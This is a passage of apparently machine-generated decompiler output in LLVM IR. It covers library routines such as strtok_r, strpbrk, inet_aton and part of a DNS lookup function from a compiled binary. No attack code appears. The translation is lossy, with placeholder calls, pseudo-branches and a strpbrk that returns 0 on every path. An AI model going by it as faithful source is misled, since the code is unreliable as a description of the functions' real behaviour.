dec_label_pc_10008660:                            ; preds = %dec_label_pc_10008654, %dec_label_pc_10008660
  %v0_10008660 = load i32, i32* %r3.global-to-local, align 4
  %v1_10008660 = add i32 %v0_10008660, -1
  %v2_10008660 = inttoptr i32 %v1_10008660 to i8*
  %v3_10008660 = load i8, i8* %v2_10008660, align 1
  %v4_10008660 = zext i8 %v3_10008660 to i32
  store i32 %v1_10008660, i32* %r3.global-to-local, align 4
  %v1_10008664 = load i32, i32* %r4.global-to-local, align 4
  %v4_10008664 = icmp eq i32 %v4_10008660, %v1_10008664
  %v0_10008668 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10008664, i32 %v0_10008668)
  %v0_1000866c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000866c = add i32 %v0_1000866c, -1
  store i32 %v1_1000866c, i32* %ctr.global-to-local, align 4
  %v2_1000866c = icmp eq i32 %v1_1000866c, 0
  br i1 %v2_1000866c, label %dec_label_pc_10008670, label %dec_label_pc_10008660

dec_label_pc_10008670:                            ; preds = %dec_label_pc_10008660, %dec_label_pc_10008654
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1000866c, { 1, 0 }
  uselistorder i32 %v0_10008654, { 1, 2, 0 }
  uselistorder i32 %v1_10008650, { 2, 1, 0 }
  uselistorder i32 %v1_10008608, { 1, 0, 2 }
  uselistorder i32 %v1_10008604, { 1, 0, 2 }
  uselistorder i32 %v1_100085f4, { 1, 0, 2 }
  uselistorder i32 %v2_100085c0, { 1, 0 }
  uselistorder i32 %v1_100085b4, { 1, 0 }
  uselistorder i32 %v0_100085b4, { 3, 2, 0, 1 }
  uselistorder i32 %v0_100085b8, { 1, 0 }
  uselistorder i32 %v1_100085ac, { 1, 0 }
  uselistorder i32 %v0_100085a8, { 1, 0, 2 }
  uselistorder i32 %v2_10008590, { 2, 0, 1, 3 }
  uselistorder i32 %v1_10008588, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 9, 5, 2, 3, 4, 6, 7, 8, 10 }
  uselistorder i32* %ctr.global-to-local, { 4, 3, 0, 6, 5, 1, 8, 7, 2 }
  uselistorder i32 %arg3, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10008660, { 1, 0 }
  uselistorder label %dec_label_pc_100085dc, { 1, 0 }
  uselistorder label %dec_label_pc_100085b0, { 1, 0 }
}

define i32 @strtok_r(i32 %arg1) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  %v3_10008684 = icmp eq i32 %arg1, 0
  %v0_1000868c = load i32, i32* @r5, align 4
  store i32 %v0_1000868c, i32* %r30.global-to-local, align 4
  %v0_10008690 = load i32, i32* @r4, align 4
  store i32 %v0_10008690, i32* %r29.global-to-local, align 4
  br i1 %v3_10008684, label %dec_label_pc_10008698, label %dec_label_pc_1000869c

dec_label_pc_10008698:                            ; preds = %entry
  %v1_10008698 = inttoptr i32 %v0_1000868c to i32*
  %v2_10008698 = load i32, i32* %v1_10008698, align 4
  store i32 %v2_10008698, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000869c

dec_label_pc_1000869c:                            ; preds = %entry, %dec_label_pc_10008698
  %v0_1000869c = phi i32 [ %arg1, %entry ], [ %v2_10008698, %dec_label_pc_10008698 ]
  store i32 %v0_1000869c, i32* @r3, align 4
  %v1_100086a0 = inttoptr i32 %v0_1000869c to i8*
  %v2_100086a0 = call i32 @__GI_strspn(i8* %v1_100086a0)
  %v0_100086a4 = load i32, i32* %r29.global-to-local, align 4
  %v0_100086a8 = load i32, i32* %r31.global-to-local, align 4
  %v2_100086a8 = add i32 %v0_100086a8, %v2_100086a0
  %v3_100086a8 = inttoptr i32 %v2_100086a8 to i8*
  %v4_100086a8 = load i8, i8* %v3_100086a8, align 1
  store i32 %v2_100086a8, i32* @r31, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 %v2_100086a8, i32* @r3, align 4
  %v3_100086b8 = icmp eq i8 %v4_100086a8, 0
  br i1 %v3_100086b8, label %dec_label_pc_100086c0, label %dec_label_pc_100086c8

dec_label_pc_100086c0:                            ; preds = %dec_label_pc_1000869c
  %v1_100086c0 = load i32, i32* %r30.global-to-local, align 4
  %v2_100086c0 = inttoptr i32 %v1_100086c0 to i32*
  store i32 %v2_100086a8, i32* %v2_100086c0, align 4
  br label %dec_label_pc_10008700

dec_label_pc_100086c8:                            ; preds = %dec_label_pc_1000869c
  store i32 268469964, i32* @lr, align 4
  %v4_100086c8 = call i32 @__GI_strpbrk(i8* %v3_100086a8, i32 %v0_100086a4, i32 0)
  store i32 %v4_100086c8, i32* %r9.global-to-local, align 4
  %v4_100086d0 = icmp eq i32 %v4_100086c8, 0
  %v0_100086d4 = load i32, i32* @r31, align 4
  store i32 %v0_100086d4, i32* @r3, align 4
  %v2_100086d8 = add i32 %v4_100086c8, 1
  store i32 %v2_100086d8, i32* %r11.global-to-local, align 4
  br i1 %v4_100086d0, label %dec_label_pc_100086e0, label %dec_label_pc_100086f0

dec_label_pc_100086e0:                            ; preds = %dec_label_pc_100086c8
  store i32 268469988, i32* @lr, align 4
  %v4_100086e0 = call i32 @rawmemchr(i32 %v0_100086d4, i32 0, i32 0)
  %v0_100086e4 = load i32, i32* @r31, align 4
  store i32 %v0_100086e4, i32* %r9.global-to-local, align 4
  %v1_100086e8 = load i32, i32* %r30.global-to-local, align 4
  %v2_100086e8 = inttoptr i32 %v1_100086e8 to i32*
  store i32 %v4_100086e0, i32* %v2_100086e8, align 4
  br label %dec_label_pc_10008700

dec_label_pc_100086f0:                            ; preds = %dec_label_pc_100086c8
  %v1_100086d0 = inttoptr i32 %v4_100086c8 to i8*
  store i8 0, i8* %v1_100086d0, align 1
  %v0_100086f8 = load i32, i32* @r31, align 4
  store i32 %v0_100086f8, i32* %r9.global-to-local, align 4
  %v0_100086fc = load i32, i32* %r11.global-to-local, align 4
  %v1_100086fc = load i32, i32* %r30.global-to-local, align 4
  %v2_100086fc = inttoptr i32 %v1_100086fc to i32*
  store i32 %v0_100086fc, i32* %v2_100086fc, align 4
  br label %dec_label_pc_10008700

dec_label_pc_10008700:                            ; preds = %dec_label_pc_100086e0, %dec_label_pc_100086c0, %dec_label_pc_100086f0
  %v0_10008704 = load i32, i32* %r9.global-to-local, align 4
  ret i32 %v0_10008704

; uselistorder directives
  uselistorder i32 %v4_100086c8, { 3, 0, 1, 2 }
  uselistorder i32 %v2_100086a8, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1000869c, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r31.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10008700, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000869c, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_100087381 = load i32, i32* @r3, align 4
  %v1_100087382 = inttoptr i32 %v0_100087381 to i8*
  %v2_100087383 = load i8, i8* %v1_100087382, align 1
  %v3_100087384 = zext i8 %v2_100087383 to i32
  store i32 %v3_100087384, i32* %r11.global-to-local, align 4
  %v3_1000873c6 = icmp eq i8 %v2_100087383, 0
  br i1 %v3_1000873c6, label %dec_label_pc_1000874c, label %dec_label_pc_10008744

dec_label_pc_1000871c:                            ; preds = %dec_label_pc_10008720
  %v3_10008720 = zext i8 %v2_10008720 to i32
  %v4_1000872c = icmp eq i32 %v3_10008720, %v1_1000872c
  %v0_1000871c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000872c, i32 %v0_1000871c)
  %v0_10008720.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_1000872c.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10008720

dec_label_pc_10008720:                            ; preds = %dec_label_pc_10008744, %dec_label_pc_1000871c
  %v1_1000872c = phi i32 [ %v1_1000872c9, %dec_label_pc_10008744 ], [ %v1_1000872c.pre, %dec_label_pc_1000871c ]
  %v0_10008720 = phi i32 [ %tmp, %dec_label_pc_10008744 ], [ %v0_10008720.pre, %dec_label_pc_1000871c ]
  %v1_10008720 = inttoptr i32 %v0_10008720 to i8*
  %v2_10008720 = load i8, i8* %v1_10008720, align 1
  %v1_10008724 = add i32 %v0_10008720, 1
  store i32 %v1_10008724, i32* %r9.global-to-local, align 4
  %v3_10008728 = icmp eq i8 %v2_10008720, 0
  br i1 %v3_10008728, label %dec_label_pc_10008734, label %dec_label_pc_1000871c

dec_label_pc_10008734:                            ; preds = %dec_label_pc_10008720
  %v0_10008734 = load i32, i32* @r3, align 4
  %v1_10008734 = add i32 %v0_10008734, 1
  store i32 %v1_10008734, i32* @r3, align 4
  %v1_10008738 = inttoptr i32 %v1_10008734 to i8*
  %v2_10008738 = load i8, i8* %v1_10008738, align 1
  %v3_10008738 = zext i8 %v2_10008738 to i32
  store i32 %v3_10008738, i32* %r11.global-to-local, align 4
  %v3_1000873c = icmp eq i8 %v2_10008738, 0
  br i1 %v3_1000873c, label %dec_label_pc_1000874c, label %dec_label_pc_10008744

dec_label_pc_10008744:                            ; preds = %entry, %dec_label_pc_10008734
  %v1_1000872c9 = phi i32 [ %v3_10008738, %dec_label_pc_10008734 ], [ %v3_100087384, %entry ]
  store i32 %tmp, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10008720

dec_label_pc_1000874c:                            ; preds = %dec_label_pc_10008734, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_10008720, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10008744, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %v3_10008754 = icmp eq i8* %arg1, null
  br i1 %v3_10008754, label %dec_label_pc_1000880c, label %dec_label_pc_1000875c

dec_label_pc_1000875c:                            ; preds = %entry
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_10008770.pre = load i32, i32* @global_var_1001d818, align 4
  br label %dec_label_pc_1000876c

dec_label_pc_1000876c:                            ; preds = %dec_label_pc_1000875c, %dec_label_pc_100087e4
  %v0_100087e4 = phi i32 [ 0, %dec_label_pc_1000875c ], [ %v2_100087ec, %dec_label_pc_100087e4 ]
  %v0_100087e8 = phi i32 [ 1, %dec_label_pc_1000875c ], [ %v1_100087e8, %dec_label_pc_100087e4 ]
  %v0_1000876c = phi i32 [ %tmp, %dec_label_pc_1000875c ], [ %v0_1000876c3, %dec_label_pc_100087e4 ]
  %v1_1000876c = inttoptr i32 %v0_1000876c to i8*
  %v2_1000876c = load i8, i8* %v1_1000876c, align 1
  %v3_1000876c = zext i8 %v2_1000876c to i32
  %v1_10008774 = mul nuw nsw i32 %v3_1000876c, 2
  %v2_10008778 = add i32 %v1_10008774, %v3_10008770.pre
  %v3_10008778 = inttoptr i32 %v2_10008778 to i16*
  %v4_10008778 = load i16, i16* %v3_10008778, align 2
  %v1_1000877c = and i16 %v4_10008778, 8
  %v3_1000877c = icmp eq i16 %v1_1000877c, 0
  br i1 %v3_1000877c, label %dec_label_pc_1000880c, label %dec_label_pc_10008784

dec_label_pc_10008784:                            ; preds = %dec_label_pc_1000876c
  br label %dec_label_pc_1000879c

dec_label_pc_1000878c:                            ; preds = %dec_label_pc_1000879c
  %v1_100087a0 = mul i32 %v1_100087ec, 10
  %v2_100087a8 = add i32 %v3_1000879c, %v1_100087a0
  %v1_1000878c = add i32 %v2_100087a8, -48
  %v1_10008790 = add i32 %v0_100087d4, 1
  %v2_10008794 = icmp sgt i32 %v1_1000878c, 255
  br i1 %v2_10008794, label %dec_label_pc_1000880c, label %dec_label_pc_1000879c

dec_label_pc_1000879c:                            ; preds = %dec_label_pc_1000878c, %dec_label_pc_10008784
  %v1_100087ec = phi i32 [ %v1_1000878c, %dec_label_pc_1000878c ], [ 0, %dec_label_pc_10008784 ]
  %v0_100087d4 = phi i32 [ %v1_10008790, %dec_label_pc_1000878c ], [ %v0_1000876c, %dec_label_pc_10008784 ]
  %v1_1000879c = inttoptr i32 %v0_100087d4 to i8*
  %v2_1000879c = load i8, i8* %v1_1000879c, align 1
  %v3_1000879c = zext i8 %v2_1000879c to i32
  %v1_100087a4 = mul nuw nsw i32 %v3_1000879c, 2
  %v2_100087ac = add i32 %v1_100087a4, %v3_10008770.pre
  %v3_100087ac = inttoptr i32 %v2_100087ac to i16*
  %v4_100087ac = load i16, i16* %v3_100087ac, align 2
  %v5_100087ac = zext i16 %v4_100087ac to i32
  %v1_100087b0 = and i32 %v5_100087ac, 8
  %v3_100087b0 = icmp eq i32 %v1_100087b0, 0
  br i1 %v3_100087b0, label %dec_label_pc_100087b8, label %dec_label_pc_1000878c

dec_label_pc_100087b8:                            ; preds = %dec_label_pc_1000879c
  %v2_100087b8 = icmp sgt i32 %v0_100087e8, 3
  br i1 %v2_100087b8, label %dec_label_pc_100087d0, label %dec_label_pc_100087c0

dec_label_pc_100087c0:                            ; preds = %dec_label_pc_100087b8
  %v3_100087c0 = icmp eq i8 %v2_1000879c, 46
  br i1 %v3_100087c0, label %dec_label_pc_100087c8, label %dec_label_pc_1000880c

dec_label_pc_100087c8:                            ; preds = %dec_label_pc_100087c0
  %v1_100087c8 = add i32 %v0_100087d4, 1
  br label %dec_label_pc_100087e4

dec_label_pc_100087d0:                            ; preds = %dec_label_pc_100087b8
  %v3_100087d0 = icmp eq i8 %v2_1000879c, 0
  %v1_100087d4 = add i32 %v0_100087d4, 1
  br i1 %v3_100087d0, label %dec_label_pc_100087e4, label %dec_label_pc_100087dc

dec_label_pc_100087dc:                            ; preds = %dec_label_pc_100087d0
  %v1_100087dc = and i32 %v5_100087ac, 32
  %v3_100087dc = icmp eq i32 %v1_100087dc, 0
  br i1 %v3_100087dc, label %dec_label_pc_1000880c, label %dec_label_pc_100087e4

dec_label_pc_100087e4:                            ; preds = %dec_label_pc_100087dc, %dec_label_pc_100087d0, %dec_label_pc_100087c8
  %v0_1000876c3 = phi i32 [ %v1_100087d4, %dec_label_pc_100087dc ], [ %v1_100087d4, %dec_label_pc_100087d0 ], [ %v1_100087c8, %dec_label_pc_100087c8 ]
  %v1_100087e4 = mul i32 %v0_100087e4, 256
  %v1_100087e8 = add nuw nsw i32 %v0_100087e8, 1
  %v2_100087ec = or i32 %v1_100087ec, %v1_100087e4
  store i32 %v2_100087ec, i32* %r5.global-to-local, align 4
  %tmp10 = icmp slt i32 %v1_100087e8, 5
  br i1 %tmp10, label %dec_label_pc_1000876c, label %dec_label_pc_100087f8

dec_label_pc_100087f8:                            ; preds = %dec_label_pc_100087e4
  %v0_100087f8 = load i32, i32* @r4, align 4
  %v3_100087f8 = icmp eq i32 %v0_100087f8, 0
  %v0_10008800 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_100087f8, i32 %v0_10008800)
  %v0_10008804 = load i32, i32* %r5.global-to-local, align 4
  %v1_10008804 = load i32, i32* @r4, align 4
  %v2_10008804 = inttoptr i32 %v1_10008804 to i32*
  store i32 %v0_10008804, i32* %v2_10008804, align 4
  ret i32 1

dec_label_pc_1000880c:                            ; preds = %dec_label_pc_100087c0, %dec_label_pc_100087dc, %dec_label_pc_1000876c, %dec_label_pc_1000878c, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_100087ec, { 1, 0 }
  uselistorder i32 %v1_100087e8, { 1, 0 }
  uselistorder i32 %v0_100087d4, { 0, 1, 3, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1000880c, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_1000876c, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r14.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  %tmp29 = call i32 @__decompiler_undefined_function_0()
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %stack_var_-212 = alloca i16, align 2
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-240 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-228 = alloca i32, align 4
  %v0_10008818 = load i32, i32* @lr, align 4
  store i32 %v0_10008818, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* %r14.global-to-local, align 4
  store i32 512, i32* @r3, align 4
  store i32 %arg2, i32* %r16.global-to-local, align 4
  store i32 %arg3, i32* @r23, align 4
  store i32 268470340, i32* @lr, align 4
  %v0_10008840 = call i32 @malloc()
  store i32 %v0_10008840, i32* @r30, align 4
  store i32 1025, i32* @r3, align 4
  store i32 268470352, i32* @lr, align 4
  %v0_1000884c = call i32 @malloc()
  %v0_10008850 = load i32, i32* @r30, align 4
  %v3_10008850 = icmp eq i32 %v0_10008850, 0
  store i32 %v0_1000884c, i32* @r21, align 4
  br i1 %v3_10008850, label %dec_label_pc_10008e0c, label %dec_label_pc_1000885c

dec_label_pc_1000885c:                            ; preds = %entry
  %v3_1000885c = icmp eq i32 %v0_1000884c, 0
  br i1 %v3_1000885c, label %dec_label_pc_10008e0c, label %dec_label_pc_10008864

dec_label_pc_10008864:                            ; preds = %dec_label_pc_1000885c
  %v0_10008864 = load i32, i32* @r23, align 4
  %v3_10008864 = icmp eq i32 %v0_10008864, 0
  br i1 %v3_10008864, label %dec_label_pc_10008e0c, label %dec_label_pc_1000886c

dec_label_pc_1000886c:                            ; preds = %dec_label_pc_10008864
  %v0_1000886c = load i32, i32* %r14.global-to-local, align 4
  %v1_1000886c = inttoptr i32 %v0_1000886c to i8*
  %v2_1000886c = load i8, i8* %v1_1000886c, align 1
  %v3_1000886c = zext i8 %v2_1000886c to i32
  store i32 %v3_1000886c, i32* %r0.global-to-local, align 4
  %v3_10008870 = icmp eq i8 %v2_1000886c, 0
  br i1 %v3_10008870, label %dec_label_pc_10008e0c, label %dec_label_pc_10008878

dec_label_pc_10008878:                            ; preds = %dec_label_pc_1000886c
  store i32 %v0_1000886c, i32* @r3, align 4
  store i32 268566528, i32* %r29.global-to-local, align 4
  %v0_10008880 = call i32 @__GI_strlen()
  %v0_10008888 = load i32, i32* %r14.global-to-local, align 4
  %v2_10008888 = add i32 %v0_10008888, %v0_10008880
  %v1_10008890 = add i32 %v2_10008888, -1
  %v2_10008890 = inttoptr i32 %v1_10008890 to i8*
  %v3_10008890 = load i8, i8* %v2_10008890, align 1
  %v4_10008890 = zext i8 %v3_10008890 to i32
  store i32 %v4_10008890, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1001fec4.436 to i32), i32* %r29.global-to-local, align 4
  %v2_10008898 = ptrtoint i32* %stack_var_-228 to i32
  store i32 %v2_10008898, i32* %r28.global-to-local, align 4
  store i32 %v2_10008898, i32* @r3, align 4
  store i32 -1, i32* @r19, align 4
  %v1_100088a8 = xor i32 %v4_10008890, 46
  store i32 %v1_100088a8, i32* %r17.global-to-local, align 4
  %v0_100088ac = call i32 @__pthread_return_void()
  %v1_100088b4 = call i32 @llvm.ctlz.i32(i32 %v1_100088a8, i1 true)
  store i32 %v1_100088b4, i32* %r17.global-to-local, align 4
  %v0_100088b8 = call i32 @__pthread_return_0()
  %v3_100088c0 = load i32, i32* @global_var_1001d894.437, align 4
  store i32 %v3_100088c0, i32* %r11.global-to-local, align 4
  %v3_100088c8 = load i16, i16* @global_var_1001d7a4.438, align 2
  %v4_100088c8 = zext i16 %v3_100088c8 to i32
  store i32 %v4_100088c8, i32* @r25, align 4
  store i32 %v2_10008898, i32* @r3, align 4
  store i32 0, i32* %r17.global-to-local, align 4
  %v1_100088d8 = load i32, i32* @r23, align 4
  store i32 0, i32* %r18.global-to-local, align 4
  store i32 -1, i32* @r22, align 4
  %v2_100088d8 = srem i32 %v3_100088c0, %v1_100088d8
  %v2_100088e4 = sub i32 %v3_100088c0, %v2_100088d8
  store i32 %v2_100088e4, i32* %r0.global-to-local, align 4
  store i32 %v2_100088d8, i32* @r26, align 4
  %v0_100088ec = call i32 @__pthread_return_void()
  %v0_10008e00.pr19 = load i32, i32* %r18.global-to-local, align 4
  %tmp57 = icmp ult i32 %v0_10008e00.pr19, 3
  br i1 %tmp57, label %dec_label_pc_100088f4.lr.ph.lr.ph, label %dec_label_pc_10008e18

dec_label_pc_100088f4.lr.ph.lr.ph:                ; preds = %dec_label_pc_10008878
  %v2_1000890c = ptrtoint i32* %stack_var_-144 to i32
  %v2_10008a20 = ptrtoint i32* %stack_var_-204 to i32
  %v2_10008a80 = ptrtoint i16* %stack_var_-212 to i32
  %v2_10008ac4 = ptrtoint i32* %stack_var_-248 to i32
  %v3_10008b20 = icmp eq i32 %tmp37, 0
  %v3_10008b2c = icmp eq i32 %tmp36, 3
  %v2_10008ba8 = icmp sgt i32 %tmp35, 0
  %tmp58 = icmp slt i32 %tmp35, 1
  %v2_10008bfc = ptrtoint i32* %stack_var_-184 to i32
  %v3_10008c28 = icmp eq i32 %tmp33, 0
  %v3_10008b9c = icmp eq i32 %tmp36, 0
  br label %dec_label_pc_100088f4.lr.ph

dec_label_pc_100088f4:                            ; preds = %dec_label_pc_100088f4.lr.ph, %dec_label_pc_10008aa4
  %v0_100088f4 = load i32, i32* @r19, align 4
  %v3_100088f4 = icmp eq i32 %v0_100088f4, -1
  br i1 %v3_100088f4, label %dec_label_pc_10008904, label %dec_label_pc_100088fc

dec_label_pc_100088fc:                            ; preds = %dec_label_pc_100088f4
  store i32 268470532, i32* @lr, align 4
  %v1_10008900 = call i32 @__libc_close(i32 %v0_100088f4)
  br label %dec_label_pc_10008904

dec_label_pc_10008904:                            ; preds = %dec_label_pc_100088f4, %dec_label_pc_100088fc
  store i32 %v2_1000890c, i32* %r29.global-to-local, align 4
  %v0_10008910 = load i32, i32* @r30, align 4
  store i32 268470552, i32* @lr, align 4
  %v3_10008914 = call i32 @__GI_memset(i32 %v0_10008910, i32 0, i32 512)
  store i32 268470568, i32* @lr, align 4
  %v3_10008924 = call i32 @__GI_memset(i32 %v2_1000890c, i32 0, i32 48)
  %v0_10008928 = load i32, i32* @r25, align 4
  %v1_10008928 = add i32 %v0_10008928, 1
  %v1_1000892c = urem i32 %v1_10008928, 65536
  store i32 %v1_1000892c, i32* @r25, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10008938 = load i32, i32* @r30, align 4
  store i32 %v1_1000892c, i32* %stack_var_-144, align 4
  %v4_1000894c = call i32 @__encode_header(i32* nonnull %stack_var_-144, i32 %v0_10008938, i32 512)
  store i32 %v4_1000894c, i32* %r28.global-to-local, align 4
  %v1_10008950 = icmp slt i32 %v4_1000894c, 0
  br i1 %v1_10008950, label %dec_label_pc_10008e18, label %dec_label_pc_10008958

dec_label_pc_10008958:                            ; preds = %dec_label_pc_10008904
  %v0_10008958 = load i32, i32* %r14.global-to-local, align 4
  store i32 %v0_10008958, i32* @r4, align 4
  %v0_10008960 = load i32, i32* @r21, align 4
  store i32 268566528, i32* %r29.global-to-local, align 4
  store i32 268470636, i32* @lr, align 4
  %v4_10008968 = call i32 @strncpy(i32 %v0_10008960, i32 %v0_10008958, i32 1025)
  store i32 ptrtoint (i32* @global_var_1001d7a8.385 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_10008898, i32* @r3, align 4
  %v0_10008980 = call i32 @__pthread_return_void()
  %v0_10008988 = call i32 @__pthread_return_0()
  %v0_10008990 = load i32, i32* @r22, align 4
  %v1_10008990 = icmp slt i32 %v0_10008990, 0
  %v0_10008994 = load i32, i32* @r26, align 4
  %v1_10008994 = mul i32 %v0_10008994, 4
  store i32 %v1_10008994, i32* %r0.global-to-local, align 4
  %v2_10008998 = add i32 %v1_10008994, %arg4
  %v3_10008998 = inttoptr i32 %v2_10008998 to i32*
  %v4_10008998 = load i32, i32* %v3_10008998, align 4
  store i32 %v4_10008998, i32* %r29.global-to-local, align 4
  br i1 %v1_10008990, label %dec_label_pc_100089e0, label %dec_label_pc_100089a0

dec_label_pc_100089a0:                            ; preds = %dec_label_pc_10008958
  %v3_100089a4 = load i32, i32* @global_var_1001d89c.440, align 4
  store i32 %v3_100089a4, i32* %r0.global-to-local, align 4
  %v2_100089a8 = icmp slt i32 %v0_10008990, %v3_100089a4
  br i1 %v2_100089a8, label %dec_label_pc_100089b0, label %dec_label_pc_100089e0

dec_label_pc_100089b0:                            ; preds = %dec_label_pc_100089a0
  store i32 ptrtoint (i32* @global_var_1000cfb0.441 to i32), i32* @r4, align 4
  %v0_100089bc = load i32, i32* @r21, align 4
  store i32 268470724, i32* @lr, align 4
  %v4_100089c0 = inttoptr i32 %v0_100089bc to i8*
  %v5_100089c0 = call i32 @__GI_strncat(i8* %v4_100089c0, i32 ptrtoint (i32* @global_var_1000cfb0.441 to i32), i32 1025, i32 268566528)
  %v0_100089c8 = load i32, i32* @r22, align 4
  %v1_100089c8 = mul i32 %v0_100089c8, 4
  store i32 %v1_100089c8, i32* %r0.global-to-local, align 4
  %v2_100089d0 = add i32 %v1_100089c8, ptrtoint (i32* @global_var_1001fef4.442 to i32)
  %v3_100089d0 = inttoptr i32 %v2_100089d0 to i32*
  %v4_100089d0 = load i32, i32* %v3_100089d0, align 4
  store i32 %v4_100089d0, i32* @r4, align 4
  %v0_100089d4 = load i32, i32* @r21, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100089e0.443 to i32), i32* @lr, align 4
  %v4_100089dc = inttoptr i32 %v0_100089d4 to i8*
  %v5_100089dc = call i32 @__GI_strncat(i8* %v4_100089dc, i32 %v4_100089d0, i32 1025, i32 ptrtoint (i32* @global_var_1001fef4.442 to i32))
  br label %dec_label_pc_100089e0

dec_label_pc_100089e0:                            ; preds = %dec_label_pc_100089a0, %dec_label_pc_10008958, %dec_label_pc_100089b0
  store i32 %v2_10008898, i32* @r3, align 4
  %v0_100089e8 = call i32 @__pthread_return_void()
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_100089f4 = load i32, i32* @r30, align 4
  %v1_100089f4 = load i32, i32* %r28.global-to-local, align 4
  %v2_100089f4 = add i32 %v1_100089f4, %v0_100089f4
  %v1_100089f8 = sub i32 512, %v1_100089f4
  %v0_10008a00 = load i32, i32* @r21, align 4
  store i32 %v0_10008a00, i32* %stack_var_-240, align 4
  store i32 268470796, i32* @lr, align 4
  %v4_10008a08 = call i32 @__encode_question(i32* nonnull %stack_var_-240, i32 %v2_100089f4, i32 %v1_100089f8)
  store i32 %v4_10008a08, i32* @r27, align 4
  %v1_10008a0c = icmp slt i32 %v4_10008a08, 0
  br i1 %v1_10008a0c, label %dec_label_pc_10008e18, label %dec_label_pc_10008a14

dec_label_pc_10008a14:                            ; preds = %dec_label_pc_100089e0
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_10008a1c = load i32, i32* @r29, align 4
  store i16 2, i16* %stack_var_-212, align 2
  store i32 268470828, i32* @lr, align 4
  %v3_10008a28 = inttoptr i32 %v0_10008a1c to i8*
  %v4_10008a28 = call i32 @inet_pton(i32 10, i8* %v3_10008a28, i32 %v2_10008a20)
  %tmp59 = icmp slt i32 %v4_10008a28, 1
  br i1 %tmp59, label %dec_label_pc_10008a3cthread-pre-split, label %dec_label_pc_10008a34

dec_label_pc_10008a34:                            ; preds = %dec_label_pc_10008a14
  store i32 10, i32* %r0.global-to-local, align 4
  store i16 10, i16* %stack_var_-212, align 2
  br label %dec_label_pc_10008a3c

dec_label_pc_10008a3cthread-pre-split:            ; preds = %dec_label_pc_10008a14
  %v3_10008a3c.pr = load i16, i16* %stack_var_-212, align 2
  br label %dec_label_pc_10008a3c

dec_label_pc_10008a3c:                            ; preds = %dec_label_pc_10008a3cthread-pre-split, %dec_label_pc_10008a34
  %v3_10008a3c = phi i16 [ %v3_10008a3c.pr, %dec_label_pc_10008a3cthread-pre-split ], [ 10, %dec_label_pc_10008a34 ]
  %v3_10008a40 = icmp eq i16 %v3_10008a3c, 10
  store i32 53, i32* %r0.global-to-local, align 4
  br i1 %v3_10008a40, label %dec_label_pc_10008a68, label %dec_label_pc_10008a54

dec_label_pc_10008a54:                            ; preds = %dec_label_pc_10008a3c
  %v0_10008a58 = load i32, i32* @r29, align 4
  store i32 268470884, i32* @lr, align 4
  %v1_10008a60 = call i32 @inet_addr(i32 %v0_10008a58)
  %v3_10008a68.pre = load i16, i16* %stack_var_-212, align 2
